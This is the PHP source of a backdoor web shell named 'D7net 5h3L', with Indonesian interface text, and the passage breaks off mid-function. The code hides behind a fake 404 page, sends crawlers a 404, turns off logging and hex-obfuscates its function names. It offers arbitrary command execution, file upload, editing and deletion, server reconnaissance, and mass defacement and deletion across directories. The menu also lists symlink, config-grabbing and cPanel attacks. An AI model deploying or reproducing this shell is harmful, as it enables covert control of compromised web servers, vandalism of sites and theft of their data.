<?php
$d7netp = "\x35\x32\x30\x36\x30\x33\x62\x65\x66\x61\x30\x30\x35\x35\x38\x30\x37\x66\x66\x36\x39\x37\x33\x38\x30\x35\x66\x30\x66\x62\x30\x38\x64\x62\x61\x61\x32\x63\x35\x36"; // md5 : yyyyyy
header("X-XSS-Protection: 0");
session_start();
ob_start();
set_time_limit(0);
error_reporting(0);
@clearstatcache();
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
$nick = "\x44\x37\x6e\x65\x74" . " 5h3L";
if (version_compare(PHP_VERSION, '5.3.0', '<')) {
	@set_magic_quotes_runtime(0);
}
if (!empty($_SERVER['HTTP_USER_AGENT'])) {
	$userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot", "curl");
	if (preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
		header('HTTP/1.0 404 Not Found');
		exit;
	}
}
function login_shell()
{
?>

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<p>Additionally, a 404 Not Found
error was encountered while trying to use an ErrorDocument to handle the request.</p>
<center><br><br><br><br><br><br><br><br><br>
			<?php
			if(isset($_GET['pet'])) {
echo'<form method="post">
<input type="password" name="d7netp">
<input type="submit" value="Login">
</form>';
	}
	?>
	<?php
	exit;
}

if (!isset($_SESSION[sha1($_SERVER['HTTP_HOST'])]))
	if (empty($d7netp) || (isset($_POST['d7netp']) && (sha1($_POST['d7netp']) == $d7netp)))
		$_SESSION[sha1($_SERVER['HTTP_HOST'])] = true;
	else
		login_shell();

function usergroup()
{
	if (!function_exists('posix_getegid')) {
		$user['name'] 	= @get_current_user();
		$user['uid']  	= @getmyuid();
		$user['gid']  	= @getmygid();
		$user['group']	= "?";
	} else {
		$user['uid'] 	= @posix_getpwuid(posix_geteuid());
		$user['gid'] 	= @posix_getgrgid(posix_getegid());
		$user['name'] 	= $user['uid']['name'];
		$user['uid'] 	= $user['uid']['uid'];
		$user['group'] 	= $user['gid']['name'];
		$user['gid'] 	= $user['gid']['gid'];
	}
	return (object) $user;
}

function exe($cmd)
{
	if (function_exists('system')) {
		@ob_start();
		@system($cmd);
		$buff = @ob_get_contents();
		@ob_end_clean();
		return $buff;
	} elseif (function_exists('exec')) {
		@exec($cmd, $results);
		$buff = "";
		foreach ($results as $result) {
			$buff .= $result;
		}
		return $buff;
	} elseif (function_exists('passthru')) {
		@ob_start();
		@passthru($cmd);
		$buff = @ob_get_contents();
		@ob_end_clean();
		return $buff;
	} elseif (function_exists('shell_exec')) {
		$buff = @shell_exec($cmd);
		return $buff;
	}
}

$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "ON" : "OFF";
$ds = @ini_get("disable_functions");
$open_basedir = @ini_get("Open_Basedir");
$safemode_exec_dir = @ini_get("safe_mode_exec_dir");
$safemode_include_dir = @ini_get("safe_mode_include_dir");
$show_ds = (!empty($ds)) ? "$ds" : "All Functions Is Accessible";
$mysql = (function_exists('mysql_connect')) ? "ON" : "OFF";
$curl = (function_exists('curl_version')) ? "ON" : "OFF";
$wget = (exe('wget --help')) ? "ON" : "OFF";
$perl = (exe('perl --help')) ? "ON" : "OFF";
$ruby = (exe('ruby --help')) ? "ON" : "OFF";
$mssql = (function_exists('mssql_connect')) ? "ON" : "OFF";
$pgsql = (function_exists('pg_connect')) ? "ON" : "OFF";
$python = (exe('python --help')) ? "ON" : "OFF";
$magicquotes = (function_exists('get_magic_quotes_gpc')) ? "ON" : "OFF";
$ssh2 = (function_exists('ssh2_connect')) ? "ON" : "OFF";
$oracle = (function_exists('oci_connect')) ? "ON" : "OFF";

$show_obdir = (!empty($open_basedir)) ? "OFF" : "ON";
$show_exec = (!empty($safemode_exec_dir)) ? "OFF" : "ON";
$show_include = (!empty($safemode_include_dir)) ? "OFF" : "ON";

if (!function_exists('posix_getegid')) {
	$user = @get_current_user();
	$uid = @getmyuid();
	$gid = @getmygid();
	$group = "?";
} else {
	$uid = @posix_getpwuid(posix_geteuid());
	$gid = @posix_getgrgid(posix_getegid());
	$user = $uid['name'];
	$uid = $uid['uid'];
	$group = $gid['name'];
	$gid = $gid['gid'];
}

function hdd($s)
{
	if ($s >= 1073741824)
		return sprintf('%1.2f', $s / 1073741824) . ' GB';
	elseif ($s >= 1048576)
		return sprintf('%1.2f', $s / 1048576) . ' MB';
	elseif ($s >= 1024)
		return sprintf('%1.2f', $s / 1024) . ' KB';
	else
		return $s . ' B';
}

$freespace = hdd(disk_free_space("/"));
$total = hdd(disk_total_space("/"));
$used = $total - $freespace;

function path()
{
	if (isset($_GET['dir'])) {
		$dir = str_replace("\\", "/", $_GET['dir']);
		@chdir($dir);
	} else {
		$dir = str_replace("\\", "/", getcwd());
	}
	return $dir;
}
$dir = scandir(path());
foreach ($dir as $folder) {
	$dirinfo['path'] = path() . DIRECTORY_SEPARATOR . $folder;
	if (!is_dir($dirinfo['path'])) continue;
	$dirinfo['link']  = ($folder === ".." ? "<a href='?dir=" . dirname(path()) . "'>$folder</a>" : ($folder === "." ?  "<a href='?dir=" . path() . "'>$folder</a>" : "<a href='?dir=" . $dirinfo['path'] . "'>$folder</a>"));
	if (function_exists('posix_getpwuid')) {
		$dirinfo['owner'] = (object) @posix_getpwuid(fileowner($dirinfo['path']));
		$dirinfo['owner'] = $dirinfo['owner']->name;
	} else {
		$dirinfo['owner'] = fileowner($dirinfo['path']);
	}
	if (function_exists('posix_getgrgid')) {
		$dirinfo['group'] = (object) @posix_getgrgid(filegroup($dirinfo['path']));
		$dirinfo['group'] = $dirinfo['group']->name;
	} else {
		$dirinfo['group'] = filegroup($dirinfo['path']);
	}
}

function OS()
{
	return (substr(strtoupper(PHP_OS), 0, 3) === "WIN") ? "Windows" : "Linux";
}

function ambilKata($param, $kata1, $kata2)
{
	if (strpos($param, $kata1) === FALSE) return FALSE;
	if (strpos($param, $kata2) === FALSE) return FALSE;
	$start = strpos($param, $kata1) + strlen($kata1);
	$end = strpos($param, $kata2, $start);
	$return = substr($param, $start, $end - $start);
	return $return;
}

function windisk()
{
	$letters = "";
	$v = explode("\\", path());
	$v = $v[0];
	foreach (range("A", "Z") as $letter) {
		$bool = $isdiskette = in_array($letter, array("A"));
		if (!$bool) $bool = is_dir("$letter:\\");
		if ($bool) {
			$letters .= "[ <a href='?dir=$letter:\\'" . ($isdiskette ? " onclick=\"return confirm('Make sure that the diskette is inserted properly, otherwise an error may occur.')\"" : "") . ">";
			if ($letter . ":" != $v) {
				$letters .= $letter;
			} else {
				$letters .= color(1, 2, $letter);
			}
			$letters .= "</a> ]";
		}
	}
}

ini_set('display_errors', FALSE);
$Array = [
	'7068705f756e616d65',
	'70687076657273696f6e',
	'6368646972',
	'676574637764',
	'707265675f73706c6974',
	'636f7079',
	'66696c655f6765745f636f6e74656e7473',
	'6261736536345f6465636f6465',
	'69735f646972',
	'6f625f656e645f636c65616e28293b',
	'756e6c696e6b',
	'6d6b646972',
	'63686d6f64',
	'7363616e646972',
	'7374725f7265706c616365',
	'68746d6c7370656369616c6368617273',
	'7661725f64756d70',
	'666f70656e',
	'667772697465',
	'66636c6f7365',
	'64617465',
	'66696c656d74696d65',
	'737562737472',
	'737072696e7466',
	'66696c657065726d73',
	'746f756368',
	'66696c655f657869737473',
	'72656e616d65',
	'69735f6172726179',
	'69735f6f626a656374',
	'737472706f73',
	'69735f7772697461626c65',
	'69735f7265616461626c65',
	'737472746f74696d65',
	'66696c6573697a65',
	'726d646972',
	'6f625f6765745f636c65616e',
	'7265616466696c65',
	'617373657274',
];
$___ = count($Array);
for ($i = 0; $i < $___; $i++) {
	$GNJ[] = uhex($Array[$i]);
}

	?>
	<!DOCTYPE html>
	<html dir="auto" lang="en-US">

	<head>
		<meta charset="UTF-8">
		<meta name="robots" content="NOINDEX, NOFOLLOW">
		<title>404 Not Found</title>
		<link rel="icon" href="https://3.bp.blogspot.com/-hBGrbH1B6mg/Wo7oe0ktjcI/AAAAAAAAAU8/Z4vm8YTdXs8LTZS4mKKSlTrTZDtAN-JCACPcBGAYYCw/s320/Chino%2BLogo%2BBy%2Bd7net.png">
		<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
	<body>
<script src="https://bellpwn.github.io/opet/jquery.min.js"></script>
<script src="https://bellpwn.github.io/opet/notify.min.js"></script>
<link rel='stylesheet' href="https://bellpwn.github.io/opet/style.css">
		<style type="text/css">
			@import url(https://fonts.googleapis.com/css?family=Signika+Negative);

			body {
				color: #000;
				font-family: 'Signika Negative';
				font-size: 16px;
				font-family: Signika Negative;
            	background-color: #515757;
           		color: #0BF0E2;
			}

			a:hover {
				color: #F05656;
			}
			input {
			margin-bottom: 3px; 
			background: rgba(0,0,0,0.3);
			border: none;
			outline: none;
			padding: 5px;
			font-size: 15px;
			color: #fff;
			text-shadow: 1px 1px 1px rgba(0,0,0,0.3);
			border: 1px solid rgba(0,0,0,0.3);
			border-radius: 10px;
			box-shadow: inset 0 -5px 45px rgba(100,100,100,0.2), 0 1px 1px rgba(255,255,255,0.2);
			-webkit-transition: box-shadow .5s ease;
			-moz-transition: box-shadow .5s ease;
			-o-transition: box-shadow .5s ease;
			-ms-transition: box-shadow .5s ease;
			transition: box-shadow .5s ease;
			}

			textarea {
			height: 400px;
			padding-left: 2px;
			margin: 5px auto;
			resize: none;
			font-color: #000;
			font-family: 'Rhodium Libre';
			font-size: 13px;
			color: #000;
			text-shadow: 1px 1px 1px rgba(0,0,0,0.3);
			order: 1px solid rgba(0,0,0,0.3);
			border-radius: 4px;
			box-shadow: inset 0 -5px 45px rgba(100,100,100,0.2), 0 1px 1px rgba(255,255,255,0.2);
			-webkit-transition: box-shadow .5s ease;
			-moz-transition: box-shadow .5s ease;
			-o-transition: box-shadow .5s ease;
			-ms-transition: box-shadow .5s ease;
			transition: box-shadow .5s ease;
			background: rgba(0,0,0,0.3);
			}
			textarea::-webkit-scrollbar {
  			width: 12px;
			}

			textarea::-webkit-scrollbar-track {
 			 background: #000000;
			}

			textarea::-webkit-scrollbar-thumb {
 	 		background-color: #000;
 	 		border: 3px solid white;
			}

        a {
            text-decoration: none;
            color: white;
        }

        tr th {
            text-align: center;
            font-weight: bold;
            padding: 9px;
        }

        tr td:nth-child(3) {
            text-align: center;
        }

        tr td {
            padding: 10px;
            font-weight: bold;
        }

        thead {
            background-color: #222;
            color: white;
        }

        h1 {
            font-family: 'Rhodium Libret', cursive;

        }
		body, a, a:link{cursor:url(http://4.bp.blogspot.com/-hAF7tPUnmEE/TwGR3lRH0EI/AAAAAAAAAs8/6pki22hc3NE/s1600/ass.png), 
		default;
		} 
		a:hover {
		cursor:url(http://3.bp.blogspot.com/-bRikgqeZx0Q/TwGR4MUEC7I/AAAAAAAAAtA/isJmS0r35Qw/s1600/pointer.png),
	wait;
	}
	ul{padding: 19px}
	li{list-style: none; display: inline;}
	li a{background: #222; color:#000;}
	li a:hover{background: #000; color:#000;}
	.navi{background: #000; height: 48px}

	li a, .dropbtn {
	display: inline-block;
	color: white;
	text-align: center;
	padding: 14px 16px;
	text-decoration: none;
}

	li a:hover, .dropdown:hover .dropbtn {
	background-color: red;
}
		</style>
		<div class="container">
			<br><br>
			<div class="y x">
				<a href="?">
					<font color="white"><center><h2>&#9763; <?php echo $nick ?> &#9763;</h2></center></font>
				</a>
			</div>
<?php
if (isset($_GET["d7net"])) {
	$d7net = uhex($_GET["d7net"]);
			$GNJ[2](uhex($_GET["d7net"]));
				} else {
			$d7net = $GNJ[3]();
		}
	$k = $GNJ[4]("/(\\\|\/)/", $d7net);
?><hr>
	<button class="btn btn-outline-light-toggle btn-sm" type="button" aria-haspopup="true"aria-expanded="false">		
<li><a href="?"><font color="#33D6D1"><i class="fa fa-home" aria-hidden="true"></i>Home</font></a>
</li>&nbsp;
<li>
<a href="?d7net=<?= hex($d7net) ?>&<?= hex('info') ?>"><i class="fa fa-info" aria-hidden="true"></i> Information</a>
</li>&nbsp;
<li>
<a href="?d7net=<?= hex($d7net) ?>&<?= hex('mass_deface') ?>"><i class="fa fa-file-text" aria-hidden="true"></i> Mass Deface</a>
</li>&nbsp;
<li>
<a href="?d7net=<?= hex($d7net) ?>&<?= hex('symlink') ?>"><i class="fa fa-server" aria-hidden="true"></i> Symlink</a>
</li>&nbsp;
<li>
<a href="?d7net=<?= hex($d7net) ?>&<?= hex('config') ?>"><i class="fa fa-database" aria-hidden="true"></i> Grab Config</a>
</li>&nbsp;
<li>
<a href="?d7net=<?= hex($d7net) ?>&<?= hex('cpanel-r') ?>"><i class="fa fa-user-secret" aria-hidden="true"></i> Cpanel</a>
</li>&nbsp;
<li>
<a href="?d7net=<?= hex($d7net) ?>&<?= hex('all_tools') ?>"><i class="fa fa-wrench" aria-hidden="true"></i> Tools</a>
</li>&nbsp;
<li>
<a href="?d7net=<?= hex($d7net) ?>&<?= hex('uploadfiles') ?>"><i class="fa fa-upload" aria-hidden="true"></i> Upload File</a>
</li>&nbsp;
<li>
<a href="?d7net=<?= hex($d7net) ?>&<?= hex('comand') ?>"><i class="fa fa-terminal" aria-hidden="true"></i> Command</a>
</li>&nbsp;
<li>
<a href="?d7net=<?= hex($d7net) ?>&<?= hex('bikinfile') ?>"><i class="fa fa-file" aria-hidden="true"></i> Buat file</a>
</li>&nbsp;
<li>
<a href="?d7net=<?= hex($d7net) ?>&<?= hex('logout') ?>">
<font color="red"><i class="fa fa-sign-out" aria-hidden="true"></i> Logout</font>&nbsp;
</a></li>
		</div></button></div>
	<center>
			<?php
			$o_ = [
				'<script>$.notify("',
				'", { className:"1",autoHideDelay: 3000,position:"right top" });</script>'
			];
			$f = $o_[0] . 'SUCCESSFULLY' . $o_[1];
			$g = $o_[0] . 'FAILED!!' . $o_[1];
			if (isset($_FILES["n"])) {
				$z = $_FILES["n"]["name"];
				$r = count($z);
				for ($i = 0; $i < $r; $i++) {
					if ($GNJ[5]($_FILES["n"]["tmp_name"][$i], $z[$i])) {
						echo $f;
					} else {
						echo $g;
					}
				}
			}
			?>

		</div>
		<?php
		echo "<br>Directory : ";
		foreach ($k as $m => $l) {
			if ($l == '' && $m == 0) {
				echo '<a href="?d7net=2f">/</a>';
			}
			if ($l == '') {
				continue;
			}
			echo '<a href="?d7net=';
			for ($i = 0; $i <= $m; $i++) {
				echo hex($k[$i]);
				if ($i != $m) {
					echo '2f';
				}
			}
			echo '">' . $l . '</a>/';
		}
		echo ' (' . x("$d7net/$c") . ')';
		print "<br>";
		print (OS() === "Windows") ? windisk() : "";
		echo "<br>";
		echo '
		<a class="btn btn-primary btn-sm ml-3" href="?d7net=' . hex($d7net) . '&n">&#10009;
		<i class="fa fa-file" aria-hidden="true" size="33px"></i> New File</a>&nbsp;&nbsp;&nbsp;&nbsp;
		<a class="btn btn-primary btn-sm" href="?d7net=' . hex($d7net) . '&l">&#10009;
		<i class="fa fa-folder-open" aria-hidden="true" size="33px"></i> New Folder</a></li><br><hr>';

		$a_ = '<table cellspacing="0" cellpadding="7" width="100%">
						<thead>
							<tr>
								<th>Dir/File name : ';
		$b_ = '<br></th></tr></thead><tbody><tr><td></td></tr><tr><td class="x"><center>
					<input onclick="location.href=\'?d7net=' . $_GET["d7net"] . '\'" type="submit" class="" value="&#60;BACK&nbsp;" />';
		$c_ = '</td></tr></tbody></table></center>';
		$d7net_ = '<center>
<input type="submit" class="form-control col-md-3" value="&nbsp;SAVE!&nbsp;" style="width:300px;" />
</form></center>';
		if (isset($_GET["s"])) {
			echo $a_ . uhex($_GET["s"]) . $b_ . '
			<input onclick="location.href=\'?d7net=' . $_GET["d7net"] . '&e=' . $_GET["s"] . '\'" type="submit" class="" value="&nbsp;EDIT&nbsp;" />
			<input onclick="location.href=\'?d7net=' . $_GET["d7net"] . '&r=' . $_GET["s"] . '\'" type="submit" class="" value="&nbsp;RENAME&nbsp;" />
			<input onclick="location.href=\'?d7net=' . $_GET["d7net"] . '&g=' . $_GET["s"] . '\'" type="submit" class="" value="&nbsp;DOWNLOAD&nbsp;" />
			<input onclick="location.href=\'?d7net=' . $_GET["d7net"] . '&x=' . $_GET["s"] . '\'" type="submit" class="" value="&nbsp;DELETE&nbsp;" /><br />
			<textarea readonly class = "form-control">' . $GNJ[15]($GNJ[6](uhex($_GET["s"]))) . '</textarea>
								' . $c_;
		} elseif (isset($_GET["y"])) {
			echo $a_ . 'REQUEST' . $b_ . '
									<form method="post">
										<input class="form-control md-3" type="text" name="1" autocomplete="off" />&nbsp;&nbsp;
										<input class="form-control md-3" type="text" name="2" autocomplete="off" />
										' . $d7net_ . '
									<br />
									<textarea readonly class = "form-control">';

			if (isset($_POST["2"])) {
				echo $GNJ[15](dre($_POST["1"], $_POST["2"]));
			}

			echo '</textarea>
								' . $c_;
		} elseif (isset($_GET["e"])) {
			echo $a_ . uhex($_GET["e"]) . $b_ . '
										<form method="post">
											<textarea name="e" class="form-control">' . $GNJ[15]($GNJ[6](uhex($_GET["e"]))) . '</textarea>
											<br />
											' . $d7net_ . '
									' . $c_ . '
									
						<script>
							$("#b64").change(function() {
								if($("#b64 option:selected").val() == 0) {
									var X = $("textarea").val();
									var Z = atob(X);
									$("textarea").val(Z);
								}
								else {
									var N = $("textarea").val();
									var I = btoa(N);
									$("textarea").val(I);
								}
							});
						</script>';
			if (isset($_POST["e"])) {
				if ($_POST["b64"] == "1") {
					$ex = $GNJ[7]($_POST["e"]);
				} else {
					$ex = $_POST["e"];
				}
				$fp = $GNJ[17](uhex($_GET["e"]), 'w');
				if ($GNJ[18]($fp, $ex)) {
					OK();
				} else {
					ER();
				}
				$GNJ[19]($fp);
			}
		} elseif (isset($_GET["x"])) {
			rec(uhex($_GET["x"]));
			if ($GNJ[26](uhex($_GET["x"]))) {
				ER();
			} else {
				OK();
			}
		} elseif (isset($_GET["t"])) {
			echo $a_ . uhex($_GET["t"]) . $b_ . '
									<form action="" method="post">
										<input name="t" class="form-control col-md-3" autocomplete="off" type="text" value="' . $GNJ[20]("Y-m-d H:i", $GNJ[21](uhex($_GET["t"]))) . '">
										' . $d7net_ . '
								' . $c_;
			if (!empty($_POST["t"])) {
				$p = $GNJ[33]($_POST["t"]);
				if ($p) {
					if (!$GNJ[25](uhex($_GET["t"]), $p, $p)) {
						ER();
					} else {
						OK();
					}
				} else {
					ER();
				}
			}
		} elseif (isset($_GET["k"])) {
			echo $a_ . uhex($_GET["k"]) . $b_ . '
									<form action="" method="post">
										<input name="b" autocomplete="off" class="form-control col-md-3" type="text" value="' . $GNJ[22]($GNJ[23]('%o', $GNJ[24](uhex($_GET["k"]))), -4) . '">
										' . $d7net_ . '
								' . $c_;
			if (!empty($_POST["b"])) {
				$x = $_POST["b"];
				$t = 0;
				for ($i = strlen($x) - 1; $i >= 0; --$i)
					$t += (int) $x[$i] * pow(8, (strlen($x) - $i - 1));
				if (!$GNJ[12](uhex($_GET["k"]), $t)) {
					ER();
				} else {
					OK();
				}
			}
		} elseif (isset($_GET["l"])) {
			echo $a_ . '<br>[ New Folder ]' . $b_ . '
									<form action="" method="post">
										<input name="l" autocomplete="off" class="form-control col-md-3" type="text" value="">
										' . $d7net_ . '
								' . $c_;
			if (isset($_POST["l"])) {
				if (!$GNJ[11]($_POST["l"])) {
					ER();
				} else {
					OK();
				}
			}
		} elseif (isset($_GET["q"])) {
			if ($GNJ[10](__FILE__)) {
				$GNJ[38]($GNJ[9]);
				header("Location: " . basename($_SERVER['PHP_SELF']) . "");
				exit();
			} else {
				echo $g;
			}
		} elseif (isset($_GET[hex('info')])) {
			echo 'SYSTEM INFORMATION<center>
						<textarea class = "form-control" readonly>
#-----------------------------------------------------------						
Server : ' . $_SERVER['HTTP_HOST'] . '
Server IP : ' . $_SERVER['SERVER_ADDR'] . ' 
Your IP : ' . $_SERVER['REMOTE_ADDR'] . '
Kernel Version : ' . php_uname() . '
Software : ' . $_SERVER['SERVER_SOFTWARE'] . '
Storage Space : ' . $used . "/" . $total . "(Free : " . $freespace . ")" . '
User / Group : ' . $user . ' (' . $uid . ') | ' . $group . ' (' . $gid . ') 
Time On Server : ' . date("d M Y h:i:s a") . '
#-----------------------------------------------------------
Disable Functions : ' . $show_ds . '
#-----------------------------------------------------------
PHP VERSION : ' . phpversion() . ' On ' . php_sapi_name() . '
#-----------------------------------------------------------
Safe Mode : ' . $sm . '
Open_Basedir : ' . $show_obdir . ' 
Safe Mode Exec Dir : ' . $show_exec . ' 
Safe Mode Include Dir : ' . $show_include . '
MySQL : ' . $mysql . ' 
MSSQL : ' . $mssql . '  
PostgreSQL : ' . $pgsql . '  
Perl : ' . $perl . '  
Python : ' . $python . ' 
Ruby : ' . $ruby . '  
WGET : ' . $wget . ' 
cURL : ' . $curl . ' 
Magic Quotes : ' . $magicquotes . ' 
SSH2 : ' . $ssh2 . ' 
Oracle : ' . $oracle . ' 
#-----------------------------------------------------------						
						</textarea>
						</center>';
			} elseif (isset($_GET[hex('bikinfile')])) {
							echo "<center>
	    <form method='POST'>
	        <input type='text' class='form-control' value='$d7net/filekamu.php' style='width: 400px;' name='nama_file' autocomplete='off' placeholder='Nama File...'><br><br/>
	        <textarea name='isi_file' class='form-control' rows='15' cols='70' placeholder='Isi File...'></textarea><br/>
	        <button type='sumbit' name='bikin'>Bikin!!</button><br><br/>
	    </form></center>";
	    if (isset($_POST['bikin'])) {
	        $nama_file = $_POST['nama_file'];
	        $isi_file = $_POST['isi_file'];
	        $handle = fopen("$nama_file", 'w');

	        if (fwrite($handle, $isi_file)) {
	            echo '<center>File Berhasil dibuat !!&nbsp;<font color="gold"><i>'.$nama_file.'</i></font><br><br></center>';
	        } else {
	            echo '<script>alert("File Gagal Dibuat");</script>';
	        }
	    }
		} elseif (isset($_GET[hex('comand')])) {
      echo "<pre><textarea class=\"form-control\" rows=\"20\" readonly>";
      if($tied["cmd"]){
        echo c($tied["cmd"]);
      }
      echo "</textarea></pre>";
      echo "<form method=\"POST\" action=\"\">
      <input type=\"text\" name=\"cmd\" class=\"form-control\" placeholder=\"uname -a\">
      <input type=\"submit\" class=\"btn btn-outline-light btn-sm\">
      </div>
      </div>
      </form>";

		} elseif (isset($_GET[hex('uploadfiles')])) {
echo '<center>
<br>
	<form enctype="multipart/form-data" method="POST">
	<input type="file" name="file">
	<button type="submit" class="btn btn-outline-light btn-sm">Upload</button>';
if (isset($_FILES['file'])) {
    if (copy($_FILES['file']['tmp_name'], $d7net . '/' . $_FILES['file']['name'])) {
        echo '<br><br><center><font color="#00ff00">Upload Success!</font></center><br/>';
    } else {
        echo '<br><br><center><font color="#C80909">Upload FAILED!</font></center><br/>';
    }
}
		} elseif (isset($_GET[hex('mass_deface')])) {
			$dir = path();
			echo "<center><form action=\"\" method=\"post\">\n";
			$dirr = $_POST['d_dir'];
			$index = $_POST["script"];
			$index = str_replace('"', "'", $index);
			$index = stripslashes($index);
			function edit_file($file, $index)
			{
				if (is_writable($file)) {
					clear_fill($file, $index);
					echo "<Span style='color:green;'><strong> [+] Nyabun 100% Successfull </strong></span><br></center>";
				} else {
					echo "<Span style='color:red;'><strong> [-] Ternyata Tidak Boleh Menyabun Disini :( </strong></span><br></center>";
				}
			}
			function hapus_massal($dir, $namafile)
			{
				if (is_writable($dir)) {
					$dira = scandir($dir);
					foreach ($dira as $dirb) {
						$dirc = "$dir/$dirb";
						$lokasi = $dirc . '/' . $namafile;
						if ($dirb === '.') {
							if (file_exists("$dir/$namafile")) {
								unlink("$dir/$namafile");
							}
						} elseif ($dirb === '..') {
							if (file_exists("" . dirname($dir) . "/$namafile")) {
								unlink("" . dirname($dir) . "/$namafile");
							}
						} else {
							if (is_dir($dirc)) {
								if (is_writable($dirc)) {
									if (file_exists($lokasi)) {
										echo "DELETED $lokasi<br>";
										unlink($lokasi);
										$idx = hapus_massal($dirc, $namafile);
									}
								}
							}
						}
					}
				}
			}
			function clear_fill($file, $index)
			{
				if (file_exists($file)) {
					$handle = fopen($file, 'w');
					fwrite($handle, '');
					fwrite($handle, $index);
					fclose($handle);
				}
			}

			function gass()
			{
				global $dirr, $index;
				chdir($dirr);
				$me = str_replace(dirname(__FILE__) . '/', '', __FILE__);
				$files = scandir($dirr);
				$notallow = array(".htaccess", "error_log", "_vti_inf.html", "_private", "_vti_bin", "_vti_cnf", "_vti_log", "_vti_pvt", "_vti_txt", "cgi-bin", ".contactemail", ".cpanel", ".fantasticodata", ".htpasswds", ".lastlogin", "access-logs", "cpbackup-exclude-used-by-backup.conf", ".cgi_auth", ".disk_usage", ".statspwd", "..", ".");
				sort($files);
				$n = 0;
				foreach ($files as $file) {
					if ($file != $me && is_dir($file) != 1 && !in_array($file, $notallow)) {
						echo "<center><Span style='color: #8A8A8A;'><strong>$dirr/</span>$file</strong> ====> ";
						edit_file($file, $index);
						flush();
						$n = $n + 1;
					}
				}
				echo "<br>";
				echo "<center><br><h3>$n Kali Anda Telah Ngecrot  Disini </h3></center><br>";
			}
			function ListFiles($dirrall)
			{

				if ($dh = opendir($dirrall)) {

					$files = array();
					$inner_files = array();
					$me = str_replace(dirname(__FILE__) . '/', '', __FILE__);
					$notallow = array($me, ".htaccess", "error_log", "_vti_inf.html", "_private", "_vti_bin", "_vti_cnf", "_vti_log", "_vti_pvt", "_vti_txt", "cgi-bin", ".contactemail", ".cpanel", ".fantasticodata", ".htpasswds", ".lastlogin", "access-logs", "cpbackup-exclude-used-by-backup.conf", ".cgi_auth", ".disk_usage", ".statspwd", "Thumbs.db");
					while ($file = readdir($dh)) {
						if ($file != "." && $file != ".." && $file[0] != '.' && !in_array($file, $notallow)) {
							if (is_dir($dirrall . "/" . $file)) {
								$inner_files = ListFiles($dirrall . "/" . $file);
								if (is_array($inner_files)) $files = array_merge($files, $inner_files);
							} else {
								array_push($files, $dirrall . "/" . $file);
							}
						}
					}

					closedir($dh);
					return $files;
				}
			}
			function gass_all()
			{
				global $index;
				$dirrall = $_POST['d_dir'];
				foreach (ListFiles($dirrall) as $key => $file) {
					$file = str_replace('//', "/", $file);
					echo "<center><strong>$file</strong> ===>";
					edit_file($file, $index);
					flush();
				}
				$key = $key + 1;
				echo "<center><br><h3>$key Kali Anda Telah Ngecrot  Disini  </h3></center><br>";
			}
			function sabun_massal($dir, $namafile, $isi_script)
			{
				if (is_writable($dir)) {
					$dira = scandir($dir);
					foreach ($dira as $dirb) {
						$dirc = "$dir/$dirb";
						$lokasi = $dirc . '/' . $namafile;
						if ($dirb === '.') {
							file_put_contents($lokasi, $isi_script);
						} elseif ($dirb === '..') {
							file_put_contents($lokasi, $isi_script);
						} else {
							if (is_dir($dirc)) {
								if (is_writable($dirc)) {
									echo "[<font color=lime>DONE</font>] $lokasi<br>";
									file_put_contents($lokasi, $isi_script);
									$idx = sabun_massal($dirc, $namafile, $isi_script);
								}
							}
						}
					}
				}
			}
			if ($_POST['mass'] == 'onedir') {
				echo "<br> Versi Text Area<br><textarea class = 'form-control' name='index' rows='10' cols='67'>\n";
				$ini = "http://";
				$mainpath = $_POST[d_dir];
				$file = $_POST[d_file];
				$dir = opendir("$mainpath");
				$code = base64_encode($_POST[script]);
				$indx = base64_decode($code);
				while ($row = readdir($dir)) {
					$start = @fopen("$row/$file", "w+");
					$finish = @fwrite($start, $indx);
					if ($finish) {
						echo "$ini$row/$file\n";
					}
				}
				echo "</textarea><br><b>Versi Text</b><br><br><br>\n";
				$mainpath = $_POST[d_dir];
				$file = $_POST[d_file];
				$dir = opendir("$mainpath");
				$code = base64_encode($_POST[script]);
				$indx = base64_decode($code);
				while ($row = readdir($dir)) {
					$start = @fopen("$row/$file", "w+");
					$finish = @fwrite($start, $indx);
					if ($finish) {
						echo '<a href="http://' . $row . '/' . $file . '" target="_blank">http://' . $row . '/' . $file . '</a><br>';
					}
				}
				echo "<hr>";
			} elseif ($_POST['mass'] == 'sabunkabeh') {
				gass();
			} elseif ($_POST['mass'] == 'hapusmassal') {
				hapus_massal($_POST['d_dir'], $_POST['d_file']);
			} elseif ($_POST['mass'] == 'sabunmematikan') {
				gass_all();
			} elseif ($_POST['mass'] == 'massdeface') {
				echo "<div style='margin: 5px auto; padding: 5px'>";
				sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
				echo "</div>";
			} else {
				echo "
		<br>
		<center><h2>Mass Deface / Delete </h2><font style='text-decoration: underline;'>
		Select Type:<br>
		</font>
		<select class=\"form-control\" name=\"mass\"  style=\"width: 450px;\" height=\"10\">
		<option value=\"onedir\">Mass Deface 1 Dir</option>
		<option value=\"massdeface\">Mass Deface ALL Dir</option>
		<option value=\"sabunkabeh\">Sabun Massal Di Tempat</option>
		<option value=\"sabunmematikan\">Sabun Massal Bunuh Diri</option>
		<option value=\"hapusmassal\">Mass Delete Files</option></center></select><br>
		<font style='text-decoration: underline;'>Folder:</font><br>
		<input class= 'form-control' type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
		<font style='text-decoration: underline;'>Filename:</font><br>
		<input class= 'form-control' type='text' name='d_file' placeholder='net.html' style='width: 150px;' height='10'><br>
		<font style='text-decoration: underline;'>Index File:</font><br>
		<textarea class= 'form-control' placeholder='Hacked by D7net' name='script' style='width: 700px; height: 300px;'></textarea><br>
		<input class= 'form-control' type='submit' name='start' value='Mass Deface' style='width: 450px;'>
		</form></center><hr><br>";
			}
		} elseif (isset($_GET[hex('fake-root')])) {
			ob_start();
	function reverse($url) {
		$ch = curl_init("http://domains.yougetsignal.com/domains.php");
